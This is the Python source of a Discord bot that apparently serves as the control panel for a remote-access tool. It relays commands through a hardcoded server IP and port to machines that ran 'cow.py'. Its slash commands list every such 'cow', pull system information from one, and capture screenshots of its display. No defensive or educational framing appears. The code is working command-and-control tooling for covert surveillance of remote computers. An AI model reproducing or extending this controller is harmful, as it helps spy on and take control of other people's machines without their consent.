import discord
from discord.ext import commands
from discord import app_commands
import logging
from dotenv import load_dotenv
import os
import socket
import asyncio

# ╔════════════════════════════════════════════════════════════════════╗
# ║                      Function to connect to the server             ║
# ╚════════════════════════════════════════════════════════════════════╝
async def connect(command):
    ip = '54.79.26.131'
    port = 4570
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.settimeout(15)
    try:
        server.connect((ip, port))
        server.send(command.encode())
        response = await asyncio.to_thread(server.recv, 4096)
        server.close()
        return response.decode()
    except socket.timeout:
        server.close()
        return "Error: Timeout occurred while waiting for server response."
    except Exception as e:
        server.close()
        return f"Error: {str(e)}"

# ╔════════════════════════════════════════════════════════════════════╗
# ║             Function to run remote commands for a specific cow     ║
# ╚════════════════════════════════════════════════════════════════════╝
async def run_remote_command(cow: str, command_name: str, payload: str = "") -> str:
    await connect(f":{command_name}\n{cow}{payload}")
    await asyncio.sleep(6)
    return await connect(f":FETCHRESPONSE\n{cow}\n{command_name}")

# ╔════════════════════════════════════════════════════════════════════╗
# ║                Load environment variables and set up bot           ║
# ╚════════════════════════════════════════════════════════════════════╝
load_dotenv()
token = os.getenv('DISCORD_TOKEN')

handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# ╔════════════════════════════════════════════════════════════════════╗
# ║                             Bot is ready                           ║
# ╚════════════════════════════════════════════════════════════════════╝
@bot.event
async def on_ready():
    print(f"{bot.user.name} is ready!")
    await bot.tree.sync()

# ╔════════════════════════════════════════════════════════════════════╗
# ║                      Command to list all cows                      ║
# ╚════════════════════════════════════════════════════════════════════╝
@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
async def listCows(interaction: discord.Interaction):
    await interaction.response.send_message("Listing all cows ever seen...")
    machines = await connect(":LISTCOWS")
    await interaction.edit_original_response(content=f"```{machines}```")

# ╔════════════════════════════════════════════════════════════════════╗
# ║                        Command to get cow info                     ║
# ╚════════════════════════════════════════════════════════════════════╝
@bot.tree.command(name="getinfo", description="Get info of cow")
@app_commands.describe(cow="The cow's name")
async def getInfo(interaction: discord.Interaction, cow: str):
    await interaction.response.send_message("Attempting to get info...")
    info = await run_remote_command(cow, "GETINFO")
    await interaction.edit_original_response(content=f"```{info}```")

# ╔════════════════════════════════════════════════════════════════════╗
# ║                   Command to get a screenshot of a cow             ║
# ╚════════════════════════════════════════════════════════════════════╝
@bot.tree.command(name="getscreenshot", description="Screenshot the cow's current display")
@app_commands.describe(cow="The cow's name")
async def getScreenshot(interaction: discord.Interaction, cow: str):
    await interaction.response.send_message("Attempting to get screenshot...")
    try:
        screenshot = await run_remote_command(cow, "GETSCREENSHOT")
        if screenshot.startswith("http"):
            embed = discord.Embed(
                title=f"Screenshot from `{cow}`",
                color=discord.Color.from_rgb(255, 182, 193)
            )
            embed.set_image(url=screenshot)
            await interaction.edit_original_response(content=None, embed=embed)
        else:
            await interaction.followup.send(f"Failed to get screenshot: `{screenshot}`")
    except Exception as e:
        await interaction.followup.send(f"Error while getting screenshot: `{str(e)}`")

# ╔════════════════════════════════════════════════════════════════════╗
# ║                          Run the bot                               ║
# ╚════════════════════════════════════════════════════════════════════╝
bot.run(token, log_handler=handler, log_level=logging.DEBUG)
